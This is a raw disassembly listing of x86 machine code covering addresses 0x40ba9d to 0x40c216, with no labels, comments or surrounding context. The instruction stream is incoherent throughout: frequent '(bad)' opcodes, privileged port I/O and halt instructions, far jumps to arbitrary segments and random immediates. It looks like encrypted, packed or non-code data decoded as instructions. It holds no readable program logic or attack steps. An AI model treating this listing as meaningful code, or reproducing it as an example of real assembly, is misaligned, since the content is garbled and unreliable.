  40ba9d:	xor    bl,bh
  40ba9f:	xor    al,0x4
  40baa1:	pop    eax
  40baa2:	adc    al,BYTE PTR [esi+0x10]
  40baa5:	xchg   DWORD PTR ds:0x28352e0e,edi
  40baab:	xchg   edi,eax
  40baac:	dec    ebx
  40baad:	dec    eax
  40baae:	fstp   DWORD PTR [edi]
  40bab0:	jmp    0x86137acc
  40bab5:	mov    cl,0x89
  40bab7:	in     al,0xda
  40bab9:	fimul  DWORD PTR [esi+0x6f]
  40babc:	clc    
  40babd:	lea    ebp,[ebx+edi*4+0x41]
  40bac1:	add    BYTE PTR [ecx],al
  40bac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bac4:	xor    BYTE PTR [ebp+esi*2+0x74],dl
  40bac8:	ds push ecx
  40baca:	test   eax,eax
  40bacc:	cbw    
  40bace:	aad    0x7f
  40bad0:	sbb    DWORD PTR [esi+edx*2-0x60],esp
  40bad4:	sub    ebx,DWORD PTR [esi+0x6f]
  40bad7:	rcl    BYTE PTR [ebx*4+0x1bfed3bb],1
  40bade:	fstp   DWORD PTR [esi-0x4c]
  40bae1:	das    
  40bae2:	mov    DWORD PTR [ebx+0x35],esp
  40bae5:	jmp    0x40bb16
  40bae7:	or     BYTE PTR [ecx+eiz*2+0xf],dl
  40baeb:	cdq    
  40baec:	xchg   BYTE PTR [edi-0x151f6106],ah
  40baf2:	pop    edx
  40baf3:	add    dh,BYTE PTR [edx+0x5a56064c]
  40baf9:	mov    ds:0xe4da5694,al
  40bafe:	and    eax,0x5a229288
  40bb03:	or     bl,BYTE PTR [edx+0x2e339375]
  40bb09:	dec    edx
  40bb0a:	adc    ebp,DWORD PTR [eax+0x44]
  40bb0d:	pop    edx
  40bb0e:	retf   0x7f09
  40bb11:	xchg   edx,eax
  40bb12:	scas   eax,DWORD PTR es:[edi]
  40bb13:	ds mov esi,0xf2fd2fcd
  40bb19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb1a:	imul   esi,DWORD PTR [ebp+0x172a16da],0x6a76da19
  40bb24:	scas   al,BYTE PTR es:[edi]
  40bb25:	add    al,0x8e
  40bb27:	mov    ds:0xcfbf7e88,al
  40bb2c:	fcomp  st(0)
  40bb2e:	sbb    BYTE PTR [edi],bh
  40bb30:	hlt    
  40bb31:	mov    bh,0xdf
  40bb33:	(bad)  
  40bb34:	(bad)  
  40bb36:	ror    DWORD PTR [ecx],0x1a
  40bb39:	in     eax,0xf3
  40bb3b:	and    BYTE PTR [ebx+0x4d],ah
  40bb3e:	hlt    
  40bb3f:	inc    esi
  40bb40:	repnz mov ds:0x97f4add6,eax
  40bb46:	jp     0x40bb07
  40bb48:	mov    dl,0x63
  40bb4a:	xor    al,0x6b
  40bb4c:	sbb    eax,0x153de3be
  40bb51:	push   ds
  40bb52:	mov    eax,0x724ad17f
  40bb57:	mov    bh,0x90
  40bb59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb5a:	sub    ebp,ecx
  40bb5c:	fnstsw WORD PTR [ebp+0x2e]
  40bb5f:	inc    edx
  40bb60:	mov    BYTE PTR [edx-0x73468d78],ah
  40bb66:	out    dx,eax
  40bb67:	sti    
  40bb68:	cmp    al,0xf2
  40bb6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb6b:	daa    
  40bb6c:	js     0x40bb64
  40bb6e:	call   0x4432489d
  40bb73:	xchg   esp,eax
  40bb74:	stos   DWORD PTR es:[edi],eax
  40bb75:	push   ebx
  40bb76:	xchg   esp,eax
  40bb77:	sub    edx,DWORD PTR [ebx]
  40bb79:	mov    al,BYTE PTR [ecx]
  40bb7b:	push   0xffffffa9
  40bb7d:	sbb    eax,edi
  40bb7f:	push   edx
  40bb80:	test   DWORD PTR [edi+0x252bb0ae],0xb1d29691
  40bb8a:	out    dx,al
  40bb8b:	push   ebx
  40bb8c:	in     eax,0x6b
  40bb8e:	(bad)  
  40bb8f:	xchg   ecx,eax
  40bb90:	cld    
  40bb91:	dec    esi
  40bb92:	lahf   
  40bb93:	imul   ebp,DWORD PTR [ecx-0x64],0xffffff97
  40bb97:	lock mov cl,0x73
  40bb9a:	dec    esp
  40bb9b:	adc    al,0x27
  40bb9d:	jmp    0x145b:0x7a7ae63e
  40bba4:	dec    ebx
  40bba5:	cmp    eax,0x9ea4799
  40bbaa:	cmp    eax,0x32486a29
  40bbaf:	out    dx,eax
  40bbb0:	jmp    0x40bbfc
  40bbb2:	jnp    0x40bb5d
  40bbb4:	jmp    0x40bbb7
  40bbb6:	push   0x3
  40bbb8:	pusha  
  40bbb9:	add    al,0xc8
  40bbbb:	push   cs
  40bbbc:	xchg   ebx,eax
  40bbbd:	jecxz  0x40bbc0
  40bbbf:	mov    dl,0xc0
  40bbc1:	add    eax,0x9e419a68
  40bbc6:	cmp    ecx,DWORD PTR [eax]
  40bbc8:	ret    
  40bbc9:	aad    0x1b
  40bbcb:	cli    
  40bbcc:	loopne 0x40bc2d
  40bbce:	fisttp DWORD PTR [di+0x3011]
  40bbd3:	inc    ebx
  40bbd4:	mov    ebp,0xfcf3a1ea
  40bbd9:	and    ebx,DWORD PTR [edi+0x364772b4]
  40bbdf:	jge    0x40bc3e
  40bbe1:	cmp    eax,0x8ddb68be
  40bbe6:	sahf   
  40bbe7:	push   ebx
  40bbe8:	mov    ah,0xfd
  40bbea:	pop    edx
  40bbeb:	push   0xa2681140
  40bbf0:	push   0x1
  40bbf2:	test   al,0x8d
  40bbf4:	dec    eax
  40bbf5:	push   esp
  40bbf6:	and    eax,0x6c6c9020
  40bbfb:	or     al,0x50
  40bbfd:	push   ds
  40bbfe:	add    BYTE PTR [ecx+0x61a2042d],dl
  40bc04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc05:	xor    eax,0xafd15955
  40bc0a:	or     BYTE PTR [ebx+0x4a],cl
  40bc0d:	pop    es
  40bc0e:	or     eax,0x182d14c8
  40bc13:	adc    eax,0x1c830a55
  40bc18:	inc    eax
  40bc19:	lds    eax,FWORD PTR ds:0xf3f62078
  40bc1f:	retf   
  40bc20:	mov    edi,0xe18312fe
  40bc25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc26:	clc    
  40bc27:	imul   edi,DWORD PTR [edi],0xfffffff8
  40bc2a:	pop    ebp
  40bc2b:	mov    WORD PTR [edi-0x45fda671],cs
  40bc31:	pop    esi
  40bc32:	sub    eax,DWORD PTR [edx+0x7]
  40bc35:	xchg   BYTE PTR [eax],cl
  40bc37:	fwait
  40bc38:	int    0x26
  40bc3a:	jg     0x40bc37
  40bc3c:	jg     0x40bcb8
  40bc3e:	pop    ds
  40bc3f:	(bad)  
  40bc40:	cli    
  40bc41:	and    edi,esp
  40bc43:	aam    0xcf
  40bc45:	popf   
  40bc46:	mov    ds:0xfd8fdfd5,eax
  40bc4b:	inc    esi
  40bc4c:	test   BYTE PTR ds:0x652120dc,0xc
  40bc53:	hlt    
  40bc54:	cld    
  40bc55:	cwde   
  40bc56:	aaa    
  40bc57:	fdivr  QWORD PTR [edi]
  40bc59:	in     al,0xe3
  40bc5b:	jg     0x40bc56
  40bc5d:	jne    0x40bc77
  40bc5f:	xchg   edi,eax
  40bc60:	fisttp WORD PTR [esi+0x25]
  40bc63:	scas   al,BYTE PTR es:[edi]
  40bc64:	mov    esi,DWORD PTR [esi-0x2abf8c67]
  40bc6a:	repnz cmp edi,esi
  40bc6d:	loop   0x40bcb8
  40bc6f:	ds test eax,0xa8e60871
  40bc76:	(bad)  
  40bc77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc78:	sub    BYTE PTR [edi-0x39],dl
  40bc7b:	shr    BYTE PTR [ebx],0xd9
  40bc7e:	and    al,0x2c
  40bc80:	outs   dx,BYTE PTR ds:[esi]
  40bc81:	adc    ebx,edx
  40bc83:	dec    ecx
  40bc84:	loop   0x40bc42
  40bc86:	and    DWORD PTR [ecx+0x5c],ebp
  40bc89:	mov    esi,0x23693667
  40bc8e:	popf   
  40bc8f:	arpl   WORD PTR [eax],si
  40bc91:	xchg   esp,eax
  40bc92:	or     al,BYTE PTR ds:0xe35a8cb8
  40bc98:	xor    DWORD PTR [edi+edx*2],edi
  40bc9b:	and    BYTE PTR [ecx+0x43],bl
  40bc9e:	mov    ds:0xb125523b,al
  40bca3:	sbb    ebx,DWORD PTR [ecx]
  40bca5:	call   0xa6d5e4a
  40bcaa:	rcr    edi,1
  40bcac:	pop    ss
  40bcad:	int    0xd0
  40bcaf:	int    0x9f
  40bcb1:	sub    DWORD PTR [edi],eax
  40bcb3:	es sti 
  40bcb5:	xchg   esp,eax
  40bcb6:	std    
  40bcb7:	popa   
  40bcb8:	mov    BYTE PTR [eax],0x98
  40bcbb:	out    dx,eax
  40bcbc:	sub    ebp,DWORD PTR [ecx]
  40bcbe:	xchg   ebp,eax
  40bcbf:	or     esi,DWORD PTR [eax]
  40bcc1:	aas    
  40bcc2:	jle    0x40bcb9
  40bcc4:	cli    
  40bcc5:	stc    
  40bcc6:	xchg   ecx,eax
  40bcc7:	push   cs
  40bcc8:	mov    ecx,0x46d76d05
  40bccd:	sar    BYTE PTR [ebp+eax*1-0x2b0c2c2d],0x95
  40bcd5:	jnp    0x40bd07
  40bcd7:	dec    ebp
  40bcd8:	popaw  
  40bcda:	hlt    
  40bcdb:	fs xchg ebx,eax
  40bcdd:	or     ecx,esi
  40bcdf:	xor    eax,0xcddbe608
  40bce4:	sbb    ch,dh
  40bce6:	jbe    0x40bcf3
  40bce8:	sti    
  40bce9:	ja     0x40bcc5
  40bceb:	addr16 push es
  40bced:	push   0x72aac71c
  40bcf2:	mov    cl,0x26
  40bcf4:	push   eax
  40bcf5:	or     DWORD PTR [esi+0x5aeaf192],esi
  40bcfb:	pop    ds
  40bcfc:	cmp    al,0xdf
  40bcfe:	push   cs
  40bcff:	adc    ah,0x58
  40bd02:	push   0xf703ada4
  40bd07:	pop    ebp
  40bd08:	adc    bh,0xb
  40bd0b:	shr    BYTE PTR [eax-0x2d2519f9],cl
  40bd11:	cmp    DWORD PTR [esi+0x8],edx
  40bd14:	adc    BYTE PTR gs:[edx+ebp*2],dl
  40bd18:	mov    ds:0x84821490,al
  40bd1d:	cmp    edi,eax
  40bd1f:	in     eax,0xff
  40bd21:	jl     0x40bca5
  40bd23:	lods   eax,DWORD PTR ds:[esi]
  40bd24:	lods   eax,DWORD PTR ds:[esi]
  40bd25:	inc    esp
  40bd27:	pop    edi
  40bd28:	sti    
  40bd29:	ror    DWORD PTR [edi],0xb0
  40bd2c:	mov    eax,0x79e780b8
  40bd31:	mov    edx,0x2dced312
  40bd36:	das    
  40bd37:	pop    ebp
  40bd38:	int3   
  40bd39:	and    edx,DWORD PTR ss:[ecx+0x7f2ad5ab]
  40bd40:	in     eax,dx
  40bd41:	scas   eax,DWORD PTR es:[edi]
  40bd42:	mov    esp,0x4be54a93
  40bd47:	cld    
  40bd48:	mov    edi,DWORD PTR [edi-0x4d]
  40bd4b:	int3   
  40bd4c:	jbe    0x40bd3d
  40bd4e:	inc    eax
  40bd4f:	dec    edx
  40bd50:	dec    esp
  40bd51:	(bad)  
  40bd52:	sub    BYTE PTR [eax-0x6f7555dc],bl
  40bd58:	data16 add bh,bl
  40bd5b:	mov    bx,0xfc7c
  40bd5f:	mov    ebx,0x33d99816
  40bd64:	xchg   esi,eax
  40bd65:	shl    edi,1
  40bd67:	pop    ebp
  40bd68:	adc    eax,0xbadbaf20
  40bd6d:	sub    eax,0x9c455449
  40bd72:	test   eax,0xb7b629a9
  40bd77:	pop    ebx
  40bd78:	cld    
  40bd79:	out    dx,al
  40bd7a:	addr16 push ds
  40bd7c:	ins    DWORD PTR es:[di],dx
  40bd7e:	stos   DWORD PTR es:[edi],eax
  40bd7f:	into   
  40bd80:	hlt    
  40bd81:	in     al,dx
  40bd82:	adc    dl,BYTE PTR [ebp+0x5f8114ca]
  40bd88:	xlat   BYTE PTR ds:[ebx]
  40bd89:	mov    ecx,0xe063a414
  40bd8e:	jae    0x40bdf0
  40bd90:	ja     0x40bd74
  40bd92:	sbb    dh,dl
  40bd94:	int3   
  40bd95:	mov    ebx,0x718abe41
  40bd9a:	push   0x7b
  40bd9c:	(bad)  
  40bd9d:	push   esp
  40bd9e:	fwait
  40bd9f:	(bad)  
  40bda0:	adc    al,0xd4
  40bda2:	(bad)  
  40bda3:	and    eax,0xc30c3a42
  40bda8:	fsubr  QWORD PTR [ebx]
  40bdaa:	xchg   esp,ebp
  40bdac:	jne    0x40bd3e
  40bdae:	(bad)  
  40bdaf:	nop
  40bdb0:	fisubr DWORD PTR [ebp+0x5e763868]
  40bdb6:	adc    eax,0x8d0836b0
  40bdbb:	adc    al,0x62
  40bdbd:	adc    eax,0x50461809
  40bdc2:	cs (bad) 
  40bdc4:	int3   
  40bdc5:	into   
  40bdc6:	xor    al,0x9
  40bdc8:	jne    0x40be1c
  40bdca:	xchg   esp,eax
  40bdcb:	cmp    al,0xfa
  40bdcd:	add    al,0x15
  40bdcf:	(bad)  
  40bdd0:	loope  0x40bd8c
  40bdd2:	add    BYTE PTR [ebp-0x748f6911],bl
  40bdd8:	adc    eax,DWORD PTR [ecx+0x8537698]
  40bdde:	inc    eax
  40bddf:	push   0x9
  40bde1:	addr16 (bad) 
  40bde3:	std    
  40bde4:	dec    ebp
  40bde5:	xor    edi,DWORD PTR [edx]
  40bde7:	mov    edi,0xc046565a
  40bdec:	push   edx
  40bded:	dec    ecx
  40bdee:	stc    
  40bdef:	aad    0x87
  40bdf1:	ret    
  40bdf2:	loope  0x40bdfc
  40bdf4:	icebp  
  40bdf5:	out    dx,al
  40bdf6:	inc    esp
  40bdf7:	fsub   st,st(6)
  40bdf9:	cld    
  40bdfa:	fnsave [edx]
  40bdfc:	add    edi,esi
  40bdfe:	mov    esp,0xe3a2e5a2
  40be03:	fadd   QWORD PTR [ecx-0x14]
  40be06:	or     DWORD PTR [ecx-0x3d],esp
  40be09:	mov    esi,0xa9509265
  40be0e:	push   esi
  40be0f:	mov    BYTE PTR [ebx],dl
  40be11:	leave  
  40be12:	aad    0xd5
  40be14:	add    DWORD PTR [eax+0x4d],edi
  40be17:	add    BYTE PTR [ecx+eiz*4],bh
  40be1a:	push   edx
  40be1b:	and    BYTE PTR [ecx],0x74
  40be1e:	in     al,0x69
  40be20:	in     al,dx
  40be21:	jmp    0x2669:0x5c1faaf9
  40be28:	in     eax,dx
  40be29:	xchg   esp,eax
  40be2a:	cmp    eax,0x8cc188d2
  40be2f:	dec    edx
  40be30:	add    bh,BYTE PTR [eax+0x3e]
  40be33:	cmp    BYTE PTR ss:[eax+0x2195e104],cl
  40be3a:	cmp    ah,cl
  40be3c:	outs   dx,DWORD PTR ds:[esi]
  40be3d:	cld    
  40be3e:	into   
  40be3f:	xor    ch,BYTE PTR [edi+0x7e79fc9c]
  40be45:	call   0x7d13b39
  40be4a:	pop    esi
  40be4b:	ja     0x40be6c
  40be4d:	xchg   ebp,eax
  40be4e:	dec    edx
  40be4f:	(bad)
  40be52:	neg    BYTE PTR [ebx+0x30]
  40be55:	mov    dl,0x9e
  40be57:	push   DWORD PTR ds:0xb972bb46
  40be5d:	int3   
  40be5e:	daa    
  40be5f:	ds cli 
  40be61:	push   esi
  40be62:	xchg   edx,eax
  40be63:	cmp    cl,ah
  40be65:	pop    edi
  40be66:	dec    ah
  40be68:	pop    ecx
  40be69:	pop    edx
  40be6a:	std    
  40be6b:	add    ebp,DWORD PTR [ecx]
  40be6d:	rcr    DWORD PTR [eax],1
  40be6f:	pop    ss
  40be70:	mov    al,ds:0xeaf50246
  40be75:	xor    bh,0xbd
  40be78:	mov    ds:0xb8de5bce,eax
  40be7d:	iret   
  40be7e:	adc    dh,BYTE PTR [edx-0x3e645947]
  40be84:	ss scas eax,DWORD PTR es:[edi]
  40be86:	out    0xbb,eax
  40be88:	sub    eax,0xb56a430c
  40be8d:	sbb    al,BYTE PTR [ecx+0x10]
  40be90:	lock jnp 0x40be32
  40be93:	stc    
  40be94:	sub    cl,bh
  40be96:	pop    ds
  40be97:	(bad)  [esp+ebp*2-0x6]
  40be9b:	xor    eax,0xf8932a94
  40bea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bea1:	mov    DWORD PTR es:[edx+ecx*2],edx
  40bea5:	je     0x40be51
  40bea7:	pop    DWORD PTR [edx+0x2babfab5]
  40bead:	bound  ebp,QWORD PTR ds:0x834e76f7
  40beb3:	sub    ebx,DWORD PTR [ebp-0x5c80773]
  40beb9:	mov    ebp,0xb9c84933
  40bebe:	xchg   al,cl
  40bec0:	adc    DWORD PTR [ebx+0x7a],edi
  40bec3:	pushf  
  40bec4:	dec    ebx
  40bec5:	cmc    
  40bec6:	cmp    DWORD PTR [ecx],esp
  40bec8:	and    al,0xdc
  40beca:	in     eax,dx
  40becb:	in     al,0x9a
  40becd:	popa   
  40bece:	or     al,BYTE PTR [edx+0x1b]
  40bed1:	adc    edx,DWORD PTR [ebp-0x3516e8b6]
  40bed7:	enter  0x50e1,0x32
  40bedb:	fld1   
  40bedd:	xor    DWORD PTR [edi],edi
  40bedf:	aaa    
  40bee0:	inc    edi
  40bee1:	sbb    BYTE PTR [esi+0x2c68adc8],ah
  40bee7:	mov    edx,0xfb9da753
  40beec:	ja     0x40be6f
  40beee:	push   edi
  40beef:	bnd ja 0x40beaf
  40bef2:	adc    eax,0xa008376d
  40bef7:	add    al,0x4a
  40bef9:	cli    
  40befa:	add    eax,0x9307a041
  40beff:	sub    DWORD PTR [edx],ebx
  40bf01:	popa   
  40bf02:	(bad)  
  40bf03:	jb     0x40bedb
  40bf05:	push   ebx
  40bf06:	jecxz  0x40bea8
  40bf08:	mov    cl,0x76
  40bf0a:	mov    edx,0x8888b630
  40bf0f:	mov    ebx,edx
  40bf11:	outs   dx,BYTE PTR ds:[esi]
  40bf12:	cwde   
  40bf13:	ror    BYTE PTR [ebp-0x8a06462],0xb5
  40bf1a:	pop    edi
  40bf1b:	dec    edi
  40bf1c:	or     ah,BYTE PTR [ecx+0x56a98067]
  40bf22:	scas   al,BYTE PTR es:[edi]
  40bf23:	push   esp
  40bf24:	push   0xb76cbab5
  40bf29:	shl    bh,cl
  40bf2b:	jbe    0x40bed2
  40bf2d:	xchg   ecx,eax
  40bf2e:	mov    al,BYTE PTR [ecx]
  40bf30:	jo     0x40bf57
  40bf32:	cmp    eax,0xecc8199a
  40bf37:	mov    edx,0x4301d574
  40bf3c:	sub    al,0xe
  40bf3e:	pop    edx
  40bf3f:	mov    BYTE PTR [ebx],dl
  40bf41:	lea    edi,[edx]
  40bf43:	xor    al,0x12
  40bf45:	dec    eax
  40bf46:	shl    BYTE PTR [ebx-0x3bc5a07e],0x57
  40bf4d:	push   ds
  40bf4e:	cmp    ecx,edi
  40bf50:	repnz (bad) 
  40bf53:	adc    eax,0xde87f87e
  40bf58:	retf   
  40bf59:	mov    ebx,0x5b16fddf
  40bf5e:	jns    0x40bf89
  40bf60:	call   FWORD PTR [esi+0x36fce5f9]
  40bf66:	xor    DWORD PTR [esi+eax*1-0x7d],0x1
  40bf6b:	inc    ecx
  40bf6c:	adc    al,dh
  40bf6e:	jge    0x40bf8f
  40bf70:	jg     0x40bf8d
  40bf72:	xchg   edx,eax
  40bf73:	das    
  40bf74:	icebp  
  40bf75:	das    
  40bf76:	dec    ch
  40bf78:	pop    ecx
  40bf79:	cmp    al,bl
  40bf7b:	add    ebx,eax
  40bf7d:	mov    al,ds:0x3cd92d20
  40bf82:	adc    DWORD PTR [ecx-0x9],esi
  40bf85:	shl    DWORD PTR [esi],0x7f
  40bf88:	in     eax,0x63
  40bf8a:	not    DWORD PTR [ecx-0x57]
  40bf8d:	xchg   esp,eax
  40bf8e:	ins    BYTE PTR es:[edi],dx
  40bf8f:	dec    esi
  40bf90:	mov    ebx,0x4eca9b22
  40bf95:	jbe    0x40bfad
  40bf97:	ret    
  40bf98:	and    al,0x26
  40bf9a:	daa    
  40bf9b:	daa    
  40bf9c:	cmp    edx,edi
  40bf9e:	ret    0x3e09
  40bfa1:	test   DWORD PTR [ebp+0x3cfe9097],0x4a1eeae5
  40bfab:	xchg   ebp,eax
  40bfac:	jno    0x40bfbe
  40bfae:	sbb    DWORD PTR [esi+0x54fa68f9],0xa5a78813
  40bfb8:	xor    al,0x9e
  40bfba:	dec    ebx
  40bfbb:	mov    dl,0x39
  40bfbd:	jecxz  0x40bf5d
  40bfbf:	xchg   dh,ch
  40bfc1:	test   eax,0x88846258
  40bfc6:	in     eax,dx
  40bfc7:	jno    0x40c037
  40bfc9:	lods   al,BYTE PTR ds:[esi]
  40bfca:	inc    eax
  40bfcb:	cli    
  40bfcc:	or     eax,0x2679784
  40bfd1:	jns    0x40bf87
  40bfd3:	loope  0x40bfe5
  40bfd5:	ins    BYTE PTR es:[edi],dx
  40bfd6:	out    0x30,al
  40bfd8:	imul   edi,DWORD PTR [edi+0x25],0xd8e14b10
  40bfdf:	daa    
  40bfe0:	add    al,0x32
  40bfe2:	xchg   ecx,eax
  40bfe3:	xchg   esp,eax
  40bfe4:	std    
  40bfe5:	push   cs
  40bfe6:	sahf   
  40bfe7:	xchg   edi,eax
  40bfe8:	stos   BYTE PTR es:[edi],al
  40bfe9:	pusha  
  40bfea:	cmp    ecx,DWORD PTR [ebp-0x294dc32f]
  40bff0:	ins    DWORD PTR es:[edi],dx
  40bff1:	xchg   ebp,eax
  40bff2:	fnsetpm(287 only) 
  40bff4:	push   es
  40bff5:	fmul   QWORD PTR ds:0xc31ba802
  40bffb:	pop    eax
  40bffc:	mov    ecx,0x6603d26c
  40c001:	adc    DWORD PTR [esp+edx*2-0x58],0x6f
  40c006:	add    DWORD PTR ss:[esi+eax*2-0x45],esp
  40c00b:	sub    al,BYTE PTR [eax-0x280499bf]
  40c011:	arpl   cx,bx
  40c013:	mov    edi,0x16bfc49e
  40c018:	adc    eax,eax
  40c01a:	call   0x5784eec7
  40c01f:	cmp    ebp,DWORD PTR [ecx+0x3d9ccb94]
  40c025:	ja     0x40bfa8
  40c027:	outs   dx,BYTE PTR ds:[esi]
  40c028:	daa    
  40c029:	mov    cl,0x28
  40c02b:	fnstenv [ebx]
  40c02d:	inc    edx
  40c02e:	enter  0x6140,0x99
  40c032:	pop    esi
  40c033:	retf   
  40c034:	or     BYTE PTR [ebx+ebp*1],ah
  40c037:	fnstenv [ecx-0x77]
  40c03a:	(bad)  
  40c03b:	(bad)  
  40c03d:	mov    al,ds:0x229b7485
  40c042:	jg     0x40c053
  40c044:	jmp    0x78d19a6d
  40c049:	js     0x40c00d
  40c04b:	daa    
  40c04c:	test   al,0xec
  40c04e:	in     eax,0xa5
  40c050:	push   ebx
  40c051:	and    eax,0xfc8ffefe
  40c056:	and    DWORD PTR [edi-0x9],edi
  40c059:	loop   0x40c085
  40c05b:	pop    ds
  40c05c:	stc    
  40c05d:	lock jnp 0x40c0c9
  40c060:	xor    al,0xea
  40c062:	test   BYTE PTR [ecx+0x38],ah
  40c065:	push   edx
  40c066:	ins    BYTE PTR es:[edi],dx
  40c067:	jb     0x40c090
  40c069:	fs nop
  40c06b:	daa    
  40c06c:	dec    edx
  40c06d:	add    DWORD PTR [esi+edi*4],0xffffffff
  40c071:	jecxz  0x40c0e2
  40c073:	mov    ds:0x7e63ffdf,eax
  40c078:	jmp    0xc7ee:0x17a79fdf
  40c07f:	out    0x15,al
  40c081:	adc    BYTE PTR [edx+0x1f3ea999],al
  40c087:	std    
  40c088:	rcr    BYTE PTR [ebx+edi*2],1
  40c08b:	out    0x9b,eax
  40c08d:	xchg   esi,eax
  40c08e:	loope  0x40c0a4
  40c090:	adc    DWORD PTR [esp+ecx*4],edi
  40c093:	jmp    0xcc86:0x185f66fd
  40c09a:	into   
  40c09b:	into   
  40c09c:	mov    dl,0xb5
  40c09e:	fucom  st(6)
  40c0a0:	push   ebx
  40c0a1:	mov    edi,0xd79728f3
  40c0a6:	stos   BYTE PTR es:[edi],al
  40c0a7:	int3   
  40c0a8:	cs in  al,dx
  40c0aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0ab:	push   esp
  40c0ac:	push   ds
  40c0ad:	and    ecx,DWORD PTR [eax]
  40c0af:	stos   BYTE PTR es:[edi],al
  40c0b0:	and    al,0x89
  40c0b2:	les    eax,FWORD PTR [esi]
  40c0b4:	out    0x48,al
  40c0b6:	xor    edx,DWORD PTR [esi+0x54]
  40c0b9:	pop    es
  40c0ba:	test   eax,0xba773e88
  40c0bf:	mov    dl,0xea
  40c0c1:	mov    ds:0xfd3f5e4c,eax
  40c0c6:	sub    eax,0xb893b432
  40c0cb:	stos   BYTE PTR es:[edi],al
  40c0cc:	add    al,0xd9
  40c0ce:	arpl   bp,cx
  40c0d0:	cmp    BYTE PTR ds:0x41813216,0x7a
  40c0d7:	fs pushw ss
  40c0da:	sbb    eax,0xd597a828
  40c0df:	dec    ebp
  40c0e1:	js     0x40c135
  40c0e3:	jg     0x40c0bb
  40c0e5:	dec    eax
  40c0e6:	cwde   
  40c0e7:	dec    eax
  40c0e8:	in     eax,0xa
  40c0ea:	dec    esp
  40c0eb:	inc    edx
  40c0ec:	(bad)  
  40c0ed:	sbb    ah,BYTE PTR [ecx]
  40c0ef:	add    ah,0x86
  40c0f2:	xor    edx,DWORD PTR [edi]
  40c0f4:	(bad)  [ebx-0x24]
  40c0f7:	inc    edx
  40c0f8:	cmp    bh,BYTE PTR [ecx-0x1be7e98a]
  40c0fe:	aaa    
  40c0ff:	fimul  WORD PTR [edx-0x7fe4d44a]
  40c105:	jmp    0x40c105
  40c107:	xor    dl,BYTE PTR [eax]
  40c109:	fbld   TBYTE PTR ds:0xf77efcf4
  40c10f:	cmp    al,0xb7
  40c111:	pop    ebp
  40c112:	dec    ebx
  40c113:	jp     0x40c0f4
  40c115:	test   al,0x3e
  40c117:	pop    edi
  40c118:	aam    0x6e
  40c11a:	xchg   esp,eax
  40c11b:	imul   esp,DWORD PTR [esi+ebx*4+0xf],0x94ac4b52
  40c123:	push   ss
  40c124:	add    eax,0xcd1abaf8
  40c129:	mov    ecx,0x76e91773
  40c12e:	adc    esi,eax
  40c130:	inc    esp
  40c131:	es out dx,eax
  40c133:	xchg   BYTE PTR [edx-0x69],dl
  40c136:	mov    ch,0x51
  40c138:	retf   0x7348
  40c13b:	test   eax,0x7a48d988
  40c140:	mov    bl,0xcd
  40c142:	xor    BYTE PTR [ebp-0x4d0aaf6c],dl
  40c148:	je     0x40c11b
  40c14a:	inc    ebx
  40c14b:	adc    ah,0x45
  40c14e:	inc    esp
  40c14f:	ins    DWORD PTR es:[edi],dx
  40c150:	loop   0x40c162
  40c152:	cmp    al,0x2
  40c154:	aas    
  40c155:	mov    al,ds:0xeae69e5c
  40c15a:	mov    WORD PTR [edi],bx
  40c15d:	std    
  40c15e:	icebp  
  40c15f:	daa    
  40c160:	cmp    BYTE PTR [edi+0x7e],bh
  40c163:	cmp    DWORD PTR [edi-0x74414803],0xffffffe9
  40c16a:	test   eax,0xf23cccc9
  40c16f:	popf   
  40c170:	mov    al,ds:0xe637dbbf
  40c175:	xlat   BYTE PTR ds:[ebx]
  40c176:	sbb    BYTE PTR [edi-0xcd1a36],bl
  40c17c:	ret    
  40c17d:	(bad)  
  40c17f:	sub    ebx,DWORD PTR [ebp-0x100ce012]
  40c185:	jle    0x40c1e8
  40c187:	test   DWORD PTR [ecx+0x32],esp
  40c18a:	cmpps  xmm4,XMMWORD PTR [ebx-0x690671ae],0x87
  40c192:	add    al,0xdf
  40c194:	stc    
  40c195:	xchg   edi,eax
  40c196:	out    dx,al
  40c197:	popa   
  40c198:	cmp    BYTE PTR [esi+ecx*4],bl
  40c19b:	call   0x41fbb09b
  40c1a0:	push   ss
  40c1a1:	stc    
  40c1a2:	(bad)  
  40c1a3:	sbb    eax,0xebd4870e
  40c1a8:	jne    0x40c1d4
  40c1aa:	xchg   ebp,eax
  40c1ab:	or     bh,bh
  40c1ad:	fucomip st,st(7)
  40c1af:	jle    0x40c132
  40c1b1:	daa    
  40c1b2:	lahf   
  40c1b3:	outs   dx,DWORD PTR ds:[esi]
  40c1b4:	rcr    DWORD PTR [eax],1
  40c1b6:	mov    ebx,0x279529b
  40c1bb:	aas    
  40c1bc:	sbb    BYTE PTR [ebx],ah
  40c1be:	mov    al,BYTE PTR [eax+0x8]
  40c1c1:	xor    ecx,DWORD PTR [edi+0x7b7d435f]
  40c1c7:	or     eax,0x64530961
  40c1cc:	je     0x40c1cb
  40c1ce:	xor    al,0x60
  40c1d0:	(bad)  
  40c1d1:	jge    0x40c20e
  40c1d3:	inc    ebp
  40c1d4:	pushf  
  40c1d5:	xchg   BYTE PTR [ecx-0x141db60],cl
  40c1db:	mov    eax,0xf3cd9896
  40c1e0:	push   ss
  40c1e1:	sbb    BYTE PTR [edi-0x52fe2bb9],ah
  40c1e7:	push   esi
  40c1e8:	or     BYTE PTR [ebx-0x5b6416e6],ah
  40c1ee:	and    edi,DWORD PTR ds:0xe776f10d
  40c1f4:	add    DWORD PTR [ecx+edx*4-0xe],eax
  40c1f8:	push   es
  40c1f9:	or     al,0x87
  40c1fb:	add    ecx,DWORD PTR [esi]
  40c1fd:	cs dec ebp
  40c1ff:	push   edx
  40c200:	cs xchg edi,eax
  40c202:	dec    eax
  40c203:	pop    edx
  40c204:	std    
  40c205:	int3   
  40c206:	aaa    
  40c207:	jo     0x40c1f2
  40c209:	ret    0x6df4
  40c20c:	inc    ecx
  40c20d:	cmp    esi,ebx
  40c20f:	jge    0x40c1f0
  40c211:	idiv   DWORD PTR [ebp-0x49]
  40c214:	jl     0x40c234
  40c216:	add    ah,bl
